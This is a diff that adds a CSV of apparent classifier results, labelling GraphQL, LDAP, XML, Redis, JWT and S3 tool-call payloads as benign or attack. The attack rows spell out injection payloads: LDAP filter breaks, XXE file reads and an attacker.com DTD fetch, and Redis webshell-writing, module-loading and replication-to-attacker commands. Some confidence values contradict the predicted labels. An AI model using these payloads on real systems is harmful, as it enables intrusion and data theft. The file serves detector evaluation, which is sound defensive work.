@@ -1,0 +1,305 @@
+tool_name,payload,true_label,pred_label,confidence,benign_prob,attack_prob,adapted
+graphql_query,"{""query"": ""query { user(id: 4) { name email } }""}",benign,attack,0.4510501027107239,0.4510500431060791,0.5489498972892761,True
+graphql_query,"{""query"": ""query { searchProducts(query: \""laptop\"") { id name } }""}",benign,attack,0.41588830947875977,0.41588830947875977,0.5841116905212402,True
+graphql_query,"{""query"": ""query { order(id: 22) { total status } }""}",benign,attack,0.47787362337112427,0.47787362337112427,0.5221263766288757,True
+graphql_query,"{""query"": ""mutation { updateItem(id: 6, status: \""active\"") { id } }""}",benign,attack,0.622382640838623,0.37761735916137695,0.622382640838623,True
+graphql_query,"{""query"": ""query { user(id: 18) { name email } }""}",benign,attack,0.4669666290283203,0.4669666290283203,0.5330333709716797,True
+graphql_query,"{""query"": ""query { user(id: 0) { name email } }""}",benign,attack,0.440559983253479,0.440559983253479,0.559440016746521,True
+graphql_query,"{""query"": ""query { product(id: 34) { name price } }""}",benign,attack,0.4777148962020874,0.5222851037979126,0.4777148962020874,True
+graphql_query,"{""query"": ""query { products(first: 10) { edges { node { name price } } } }""}",benign,attack,0.47016435861587524,0.47016432881355286,0.5298356413841248,True
+graphql_query,"{""query"": ""query { product(id: 8) { name price } }""}",benign,attack,0.4932575225830078,0.5067424774169922,0.4932575523853302,True
+graphql_query,"{""query"": ""{ __typename }""}",benign,attack,0.4323039650917053,0.4323039948940277,0.5676960349082947,True
+graphql_query,"{""query"": ""mutation { updateItem(id: 24, status: \""active\"") { id } }""}",benign,attack,0.6186943650245667,0.38130563497543335,0.6186943650245667,True
+graphql_query,"{""query"": ""query { product(id: 14) { name price } }"", ""variables"": {""id"": ""123""}",benign,attack,0.4378594756126404,0.5621405243873596,0.437859445810318,True
+graphql_query,"{""query"": ""mutation { createPost(title: \""Test\"") { id } }""}",benign,attack,0.6483131647109985,0.35168683528900146,0.6483131647109985,True
+graphql_query,"{""query"": ""query { me { id name email } }""}",benign,attack,0.4074110984802246,0.4074110686779022,0.5925889015197754,True
+graphql_query,"{""query"": ""query { categories { id name products { name } } }""}",benign,attack,0.4369075894355774,0.4369075894355774,0.5630924105644226,True
+graphql_query,"{""query"": ""query { comments(postId: 20) { id text } }""}",benign,attack,0.46194344758987427,0.46194347739219666,0.5380565524101257,True
+graphql_query,"{""query"": ""query { user(id: 1) { name email } }""}",benign,attack,0.44816678762435913,0.44816678762435913,0.5518332123756409,True
+graphql_query,"{""query"": ""query { user(id: 32) { name email } }""}",benign,attack,0.45565998554229736,0.45565998554229736,0.5443400144577026,True
+graphql_query,"{""query"": ""query { posts(first: 15) { edges { node { title } } } }"", ""variables""",benign,attack,0.4832074046134949,0.5167925953865051,0.4832074046134949,True
+graphql_query,"{""query"": ""mutation { updateItem(id: 16, status: \""active\"") { id } }""}",benign,attack,0.6216612458229065,0.3783387541770935,0.6216612458229065,True
+graphql_query,"{""query"": ""mutation { createPost(title: \""Hello\"") { id } }""}",benign,attack,0.6553602814674377,0.34463974833488464,0.6553602814674377,True
+graphql_query,"{""query"": ""query GetUser($id: ID!) { user(id: $id) { name } }"", ""variables"": {""i",benign,attack,0.4466704726219177,0.4466705024242401,0.5533295273780823,True
+graphql_query,"{""query"": ""query { product(id: 36) { name price } }""}",benign,attack,0.47400856018066406,0.5259914398193359,0.4740085303783417,True
+graphql_query,"{""query"": ""query { comments(postId: 30) { id text } }""}",benign,attack,0.4736669063568115,0.4736669063568115,0.5263330936431885,True
+graphql_query,"{""query"": ""query { comments(postId: 26) { id text } }""}",benign,attack,0.46672123670578003,0.4667212963104248,0.53327876329422,True
+graphql_query,"{""query"": ""query { user(id: 2) { name email } }"", ""variables"": {""id"": ""123""}}",benign,attack,0.4955223798751831,0.4955223500728607,0.5044776201248169,True
+graphql_query,"{""query"": ""mutation { updateItem(id: 12, status: \""active\"") { id } }""}",benign,attack,0.6182224750518799,0.3817775249481201,0.6182224750518799,True
+graphql_query,"{""query"": ""mutation { updateUser(id: 1, name: \""John\"") { id } }""}",benign,attack,0.6297406554222107,0.3702593147754669,0.6297406554222107,True
+graphql_query,"{""query"": ""query { orders(status: PENDING) { id total } }""}",benign,attack,0.4811131954193115,0.4811131954193115,0.5188868045806885,True
+graphql_query,"{""query"": ""query { order(id: 28) { total status } }""}",benign,attack,0.4849399924278259,0.4849400520324707,0.5150600075721741,True
+graphql_query,"{""query"": ""query { users { email passwordHash } }""}",attack,attack,0.6357960104942322,0.3642039895057678,0.6357960104942322,True
+graphql_query,"{""query"": ""query { users(first: 999999999) { edges { node { id } } } }""}",attack,attack,0.47487854957580566,0.47487860918045044,0.5251214504241943,True
+graphql_query,"{""query"": ""{\""query\"": \""query { user(id: \\\""1 OR 1=1\\\"") { name } }\""}""}",attack,attack,0.6497360467910767,0.35026392340660095,0.6497360467910767,True
+graphql_query,"{""query"": ""query { auditLogs { action userId ipAddress } }""}",attack,attack,0.6068112850189209,0.3931887447834015,0.6068112850189209,True
+graphql_query,"{""query"": ""mutation { deleteAllUsers { count } }""}",attack,attack,0.6375693082809448,0.3624306619167328,0.6375693082809448,True
+graphql_query,"{""query"": ""query { __schema { types { name fields { name } } } }""}",attack,attack,0.40213656425476074,0.40213656425476074,0.5978634357452393,True
+graphql_query,"{""query"": ""query { __type(name: \""User\"") { fields { name type { name } } } }""}",attack,attack,0.6147782206535339,0.3852217495441437,0.6147782206535339,True
+graphql_query,"{""query"": ""query { admin { apiKey secretToken } }""}",attack,attack,0.6630528569221497,0.33694714307785034,0.6630528569221497,True
+graphql_query,"{""query"": ""query x($id: String!) { user(id: $id) { name } }"", ""variables"": {""id""",attack,attack,0.6287083625793457,0.3712916076183319,0.6287083625793457,True
+graphql_query,"{""query"": ""query { a]};alert(1)// }""}",attack,attack,0.6530725955963135,0.34692737460136414,0.6530725955963135,True
+ldap_query,"{""filter"": ""(cn=User 18)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.4542921781539917,0.4542921781539917,0.5457078218460083,True
+ldap_query,"{""filter"": ""(objectClass=person)"", ""base"": ""dc=example,dc=com""}",benign,attack,0.41091716289520264,0.41091716289520264,0.5890828371047974,True
+ldap_query,"{""filter"": ""(uid=user14)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.4870644211769104,0.5129355788230896,0.487064391374588,True
+ldap_query,"{""filter"": ""(title=Engineer)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.43180930614471436,0.5681906938552856,0.43180936574935913,True
+ldap_query,"{""filter"": ""(mail=user12@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.49971920251846313,0.49971920251846313,0.5002807974815369,True
+ldap_query,"{""filter"": ""(sn=Smith)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.48221224546432495,0.517787754535675,0.48221227526664734,True
+ldap_query,"{""filter"": ""(&(department=IT)(active=true))"", ""base"": ""ou=employees,dc=corp,dc=n",benign,attack,0.6036787629127502,0.39632126688957214,0.6036787629127502,True
+ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.6317926645278931,0.36820730566978455,0.6317926645278931,True
+ldap_query,"{""filter"": ""(telephoneNumber=*)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,attack,0.43075430393218994,0.43075430393218994,0.5692456960678101,True
+ldap_query,"{""filter"": ""(mail=user34@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.49474847316741943,0.5052515268325806,0.4947485029697418,True
+ldap_query,"{""filter"": ""(&(department=dept4)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.634701669216156,0.3652983605861664,0.634701669216156,True
+ldap_query,"{""filter"": ""(cn=John Doe)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,attack,0.46811187267303467,0.46811187267303467,0.5318881273269653,True
+ldap_query,"{""filter"": ""(cn=User 28)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.45491427183151245,0.4549142122268677,0.5450857281684875,True
+ldap_query,"{""filter"": ""(uid=john)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.4183899760246277,0.4183900058269501,0.5816100239753723,True
+ldap_query,"{""filter"": ""(mail=user6@example.com)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.46680957078933716,0.46680954098701477,0.5331904292106628,True
+ldap_query,"{""filter"": ""(employeeNumber=2)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.4813326597213745,0.4813326597213745,0.5186673402786255,True
+ldap_query,"{""filter"": ""(uid=user36)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.4902617335319519,0.5097382664680481,0.49026167392730713,True
+ldap_query,"{""filter"": ""(mail=user16@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.4919644594192505,0.4919644594192505,0.5080355405807495,True
+ldap_query,"{""filter"": ""(employeeNumber=20)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.4983288049697876,0.5016711950302124,0.4983287751674652,True
+ldap_query,"{""filter"": ""(employeeNumber=22)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.4977368712425232,0.4977369010448456,0.5022631287574768,True
+ldap_query,"{""filter"": ""(mail=user32@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.41517460346221924,0.41517457365989685,0.5848253965377808,True
+ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,attack,0.6024616956710815,0.39753833413124084,0.6024616956710815,True
+ldap_query,"{""filter"": ""(&(department=dept6)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,attack,0.401023805141449,0.4010237455368042,0.598976194858551,True
+ldap_query,"{""filter"": ""(mail=*@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.6053838133811951,0.39461618661880493,0.6053838133811951,True
+ldap_query,"{""filter"": ""(employeeNumber=0)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.4413965940475464,0.4413966238498688,0.5586034059524536,True
+ldap_query,"{""filter"": ""(uid=user8)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.462902307510376,0.4629022479057312,0.537097692489624,True
+ldap_query,"{""filter"": ""(employeeNumber=24)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.45263671875,0.54736328125,0.4526367783546448,True
+ldap_query,"{""filter"": ""\\00*)(uid=admin"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.6292048692703247,0.3707951307296753,0.6292048692703247,True
+ldap_query,"{""filter"": ""(uid=admin)"", ""base"": ""ou=admins,dc=corp,dc=net""}",attack,attack,0.4212442636489868,0.4212442636489868,0.5787557363510132,True
+ldap_query,"{""filter"": ""(objectClass=*)"", ""base"": ""cn=admin,dc=example,dc=com""}",attack,attack,0.6276102066040039,0.3723897933959961,0.6276102066040039,True
+ldap_query,"{""filter"": ""*)(|(objectClass=*))"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.6762217879295349,0.32377827167510986,0.6762217879295349,True
+ldap_query,"{""filter"": ""(memberOf=cn=Domain Admins)"", ""base"": ""dc=example,dc=com""}",attack,attack,0.42268872261047363,0.42268866300582886,0.5773112773895264,True
+ldap_query,"{""filter"": ""admin)(|(password=*)"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.657622218132019,0.34237775206565857,0.657622218132019,True
+ldap_query,"{""filter"": ""*)(objectClass=*"", ""base"": ""dc=example,dc=com""}",attack,attack,0.6559468507766724,0.34405311942100525,0.6559468507766724,True
+ldap_query,"{""filter"": "")(cn=*)(|(cn=*"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.6665327548980713,0.3334672451019287,0.6665327548980713,True
+ldap_query,"{""filter"": ""*)(uid=*))(|(uid=*"", ""base"": ""dc=example,dc=com""}",attack,attack,0.67169588804245,0.32830411195755005,0.67169588804245,True
+parse_xml,"{""xml"": ""<config><item id=\""18\"">value</item></config>""}",benign,attack,0.6026273965835571,0.3973725736141205,0.6026273965835571,True
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>12</id></data>""}",benign,attack,0.4176831841468811,0.4176831841468811,0.5823168158531189,True
+parse_xml,"{""xml"": ""<users><user id=\""1\""><name>John</name></user></users>""}",benign,attack,0.6144615411758423,0.3855384588241577,0.6144615411758423,True
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>2</id></data>""}",benign,attack,0.40845996141433716,0.40845993161201477,0.5915400385856628,True
+parse_xml,"{""xml"": ""<users><user id=\""10\""><name>User10</name></user></users>""}",benign,attack,0.4180458188056946,0.41804584860801697,0.5819541811943054,True
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 22</message></response>""}",benign,attack,0.6323593258857727,0.36764073371887207,0.6323593258857727,True
+parse_xml,"{""xml"": ""<order id=\""8\""><status>pending</status></order>""}",benign,attack,0.405798077583313,0.405798077583313,0.594201922416687,True
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 28</message></response>""}",benign,attack,0.6317527294158936,0.36824727058410645,0.6317527294158936,True
+parse_xml,"{""xml"": ""<note><to>User</to><from>Admin</from><body>Hello</body></note>""}",benign,attack,0.6477265357971191,0.35227349400520325,0.6477265357971191,True
+parse_xml,"{""xml"": ""<order id=\""24\""><status>pending</status></order>""}",benign,attack,0.41004687547683716,0.41004687547683716,0.5899531245231628,True
+parse_xml,"{""xml"": ""<feed><entry><title>Hello</title></entry></feed>""}",benign,attack,0.44840437173843384,0.44840434193611145,0.5515956282615662,True
+parse_xml,"{""xml"": ""<order><id>123</id><items><item>Book</item></items></order>""}",benign,attack,0.4966391921043396,0.5033608078956604,0.4966391921043396,True
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><item>test</item></data>""}",benign,attack,0.6019085645675659,0.3980914056301117,0.6019085645675659,True
+parse_xml,"{""xml"": ""<users><user id=\""16\""><name>User16</name></user></users>""}",benign,attack,0.40849757194519043,0.40849757194519043,0.5915024280548096,True
+parse_xml,"{""xml"": ""<config><item id=\""30\"">value</item></config>""}",benign,attack,0.4058690071105957,0.4058689773082733,0.5941309928894043,True
+parse_xml,"{""xml"": ""<users><user id=\""26\""><name>User26</name></user></users>""}",benign,attack,0.4074193835258484,0.4074193835258484,0.5925806164741516,True
+parse_xml,"{""xml"": ""<products><product><name>Widget</name><price>9.99</price></product></pr",benign,attack,0.48293936252593994,0.5170606374740601,0.48293933272361755,True
+parse_xml,"{""xml"": ""<config><item id=\""0\"">value</item></config>""}",benign,attack,0.619676947593689,0.3803230822086334,0.619676947593689,True
+parse_xml,"{""xml"": ""<config><item id=\""6\"">value</item></config>""}",benign,attack,0.6043252348899841,0.3956747353076935,0.6043252348899841,True
+parse_xml,"{""xml"": ""<response status=\""ok\""><message>Success</message></response>""}",benign,attack,0.6522541642189026,0.3477458953857422,0.6522541642189026,True
+parse_xml,"{""xml"": ""<config><setting name=\""debug\"">false</setting></config>""}",benign,attack,0.6609715223312378,0.3390285074710846,0.6609715223312378,True
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>4</id></data>""}",benign,attack,0.41075414419174194,0.41075411438941956,0.5892458558082581,True
+parse_xml,"{""xml"": ""<config><item id=\""20\"">value</item></config>""}",benign,attack,0.4010545015335083,0.4010545015335083,0.5989454984664917,True
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 14</message></response>""}",benign,attack,0.6278678774833679,0.3721321225166321,0.6278678774833679,True
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///et",attack,attack,0.6940029263496399,0.3059971034526825,0.6940029263496399,True
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://169.",attack,attack,0.6386898756027222,0.3613101541996002,0.6386898756027222,True
+parse_xml,"{""xml"": ""<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode",attack,attack,0.6888470649719238,0.31115296483039856,0.6888470649719238,True
+parse_xml,"{""xml"": ""<credentials><username>admin</username><password>secret</password></cre",attack,attack,0.6320208311080933,0.3679791986942291,0.6320208311080933,True
+parse_xml,"{""xml"": ""<config><apiKey>sk-xxx</apiKey></config>""}",attack,attack,0.6173527836799622,0.38264718651771545,0.6173527836799622,True
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/",attack,attack,0.6961817145347595,0.30381831526756287,0.6961817145347595,True
+parse_xml,"{""xml"": ""<!DOCTYPE :[ <!ENTITY x SYSTEM \""file:///dev/random\""> ]><x>&x;</x>""}",attack,attack,0.6843338012695312,0.31566622853279114,0.6843338012695312,True
+parse_xml,"{""xml"": ""<!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%d",attack,attack,0.6758511662483215,0.32414883375167847,0.6758511662483215,True
+redis_command,"{""command"": ""GET"", ""args"": [""session:18""]}",benign,attack,0.49941378831863403,0.500586211681366,0.49941378831863403,True
+redis_command,"{""command"": ""GET"", ""args"": [""session:22""]}",benign,attack,0.4972490072250366,0.4972490072250366,0.5027509927749634,True
+redis_command,"{""command"": ""HGET"", ""args"": [""user:28"", ""name""]}",benign,attack,0.4907955527305603,0.5092044472694397,0.4907955527305603,True
+redis_command,"{""command"": ""HSET"", ""args"": [""user:1"", ""email"", ""john@example.com""]}",benign,attack,0.4810161590576172,0.4810160994529724,0.5189838409423828,True
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:14"", ""3600""]}",benign,attack,0.46355140209198,0.53644859790802,0.4635513722896576,True
+redis_command,"{""command"": ""HGET"", ""args"": [""user:6"", ""name""]}",benign,attack,0.49362295866012573,0.49362295866012573,0.5063770413398743,True
+redis_command,"{""command"": ""INCR"", ""args"": [""counter""]}",benign,attack,0.44286882877349854,0.4428688585758209,0.5571311712265015,True
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:38""]}",benign,attack,0.49978524446487427,0.49978524446487427,0.5002147555351257,True
+redis_command,"{""command"": ""SADD"", ""args"": [""tags"", ""python""]}",benign,attack,0.43497592210769653,0.43497592210769653,0.5650240778923035,True
+redis_command,"{""command"": ""ZADD"", ""args"": [""leaderboard"", ""100"", ""user1""]}",benign,attack,0.4795129895210266,0.5204870104789734,0.479513019323349,True
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:0"", ""task0""]}",benign,attack,0.4833148717880249,0.4833149313926697,0.5166851282119751,True
+redis_command,"{""command"": ""HGET"", ""args"": [""user:10"", ""name""]}",benign,attack,0.49978673458099365,0.4997867941856384,0.5002132654190063,True
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue"", ""task1""]}",benign,attack,0.47757428884506226,0.47757428884506226,0.5224257111549377,True
+redis_command,"{""command"": ""HGET"", ""args"": [""user:1"", ""name""]}",benign,attack,0.4810367822647095,0.4810367524623871,0.5189632177352905,True
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page"", ""data""]}",benign,attack,0.47828352451324463,0.5217164754867554,0.478283554315567,True
+redis_command,"{""command"": ""GET"", ""args"": [""session:123""]}",benign,attack,0.4873392581939697,0.4873392879962921,0.5126607418060303,True
+redis_command,"{""command"": ""GET"", ""args"": [""session:2""]}",benign,attack,0.46419817209243774,0.46419820189476013,0.5358018279075623,True
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:20""]}",benign,attack,0.4955899715423584,0.4955900013446808,0.5044100284576416,True
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page:36"", ""data""]}",benign,attack,0.4462089538574219,0.5537910461425781,0.4462089538574219,True
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:30""]}",benign,attack,0.4872296452522278,0.5127703547477722,0.4872296154499054,True
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:32""]}",benign,attack,0.4793820381164551,0.4793820381164551,0.5206179618835449,True
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page:4"", ""data""]}",benign,attack,0.4675745368003845,0.5324254631996155,0.4675745666027069,True
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:3"", ""task8""]}",benign,attack,0.4993715286254883,0.4993715286254883,0.5006284713745117,True
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:1"", ""task26""]}",benign,attack,0.49694448709487915,0.5030555129051208,0.49694445729255676,True
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:12""]}",benign,attack,0.4900742173194885,0.49007418751716614,0.5099257826805115,True
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:24""]}",benign,attack,0.4979371428489685,0.4979371428489685,0.5020628571510315,True
+redis_command,"{""command"": ""TTL"", ""args"": [""session:123""]}",benign,attack,0.48456084728240967,0.48456087708473206,0.5154391527175903,True
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:16"", ""3600""]}",benign,attack,0.482352077960968,0.517647922039032,0.4823521077632904,True
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""cache:key"", ""3600""]}",benign,attack,0.4990062117576599,0.5009937882423401,0.4990062415599823,True
+redis_command,"{""command"": ""GET"", ""args"": [""session:34""]}",benign,attack,0.4927821755409241,0.4927821755409241,0.5072178244590759,True
+redis_command,"{""command"": ""DEBUG"", ""args"": [""SEGFAULT""]}",attack,attack,0.41541820764541626,0.41541820764541626,0.5845817923545837,True
+redis_command,"{""command"": ""KEYS"", ""args"": [""*""]}",attack,attack,0.41839516162872314,0.41839516162872314,0.5816048383712769,True
+redis_command,"{""command"": ""EVAL"", ""args"": [""return os.execute('id')"", ""0""]}",attack,attack,0.6660690903663635,0.3339309096336365,0.6660690903663635,True
+redis_command,"{""command"": ""MODULE"", ""args"": [""LOAD"", ""/tmp/malicious.so""]}",attack,attack,0.637467086315155,0.36253291368484497,0.637467086315155,True
+redis_command,"{""command"": ""CONFIG"", ""args"": [""GET"", ""requirepass""]}",attack,attack,0.6028097867965698,0.3971902132034302,0.6028097867965698,True
+redis_command,"{""command"": ""FLUSHALL"", ""args"": []}",attack,attack,0.4074748158454895,0.4074747562408447,0.5925251841545105,True
+redis_command,"{""command"": ""SLAVEOF"", ""args"": [""attacker.com"", ""6379""]}",attack,attack,0.478718638420105,0.4787185788154602,0.521281361579895,True
+redis_command,"{""command"": ""INFO"", ""args"": []}",attack,attack,0.4421766996383667,0.4421766698360443,0.5578233003616333,True
+redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dir"", ""/var/www/html""]}",attack,attack,0.4130058288574219,0.41300585865974426,0.5869941711425781,True
+redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dbfilename"", ""shell.php""]}",attack,attack,0.6187093257904053,0.3812907040119171,0.6187093257904053,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidGVzdCJ9.sig""}",benign,attack,0.4892376661300659,0.4892376959323883,0.5107623338699341,True
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4963908791542053,0.5036091208457947,0.49639084935188293,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49254894256591797,0.49254894256591797,0.507451057434082,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49636638164520264,0.5036336183547974,0.49636638164520264,True
+verify_jwt,"{""token"": ""eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmFuZSJ9.sig""}",benign,attack,0.45635491609573364,0.45635488629341125,0.5436450839042664,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4985805153846741,0.5014194846153259,0.4985805153846741,True
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.48687201738357544,0.48687198758125305,0.5131279826164246,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49041473865509033,0.5095852613449097,0.49041470885276794,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4997764825820923,0.4997765123844147,0.5002235174179077,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4974457621574402,0.4974457323551178,0.5025542378425598,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.sig""}",benign,attack,0.4742288589477539,0.4742288291454315,0.5257711410522461,True
+verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJhcHAiLCJzdWIiOiJ1c2Vy",benign,attack,0.47388023138046265,0.4738802909851074,0.5261197686195374,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49837756156921387,0.49837756156921387,0.5016224384307861,True
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4888746738433838,0.4888746738433838,0.5111253261566162,True
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.48655831813812256,0.48655828833580017,0.5134416818618774,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49918895959854126,0.49918892979621887,0.5008110404014587,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFt",benign,attack,0.4793940782546997,0.4793940782546997,0.5206059217453003,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4950883388519287,0.4950883686542511,0.5049116611480713,True
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4912865161895752,0.4912864863872528,0.5087134838104248,True
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4996826648712158,0.4996826648712158,0.5003173351287842,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4955984354019165,0.5044015645980835,0.49559837579727173,True
+verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inwgc2xlZXAgMTAgfCJ9.eyJy",attack,attack,0.42647355794906616,0.4264734983444214,0.5735264420509338,True
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig"", ""ke",attack,attack,0.43144840002059937,0.431448370218277,0.5685515999794006,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5IjoieHh4In0.sig""}",attack,attack,0.4751436114311218,0.4751436114311218,0.5248563885688782,True
+verify_jwt,"{""token"": ""eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.""}",attack,attack,0.6207149624824524,0.3792850077152252,0.6207149624824524,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJrIjoiY",attack,attack,0.44784730672836304,0.44784730672836304,0.552152693271637,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd",attack,attack,0.41935014724731445,0.41935011744499207,0.5806498527526855,True
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.secret""}",attack,attack,0.40766650438308716,0.40766647458076477,0.5923334956169128,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/18/""}",benign,attack,0.4130171537399292,0.5869828462600708,0.413017213344574,True
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report10.csv""}",benign,benign,0.6201833486557007,0.6201833486557007,0.3798166513442993,True
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/""}",benign,attack,0.44218093156814575,0.5578190684318542,0.44218096137046814,True
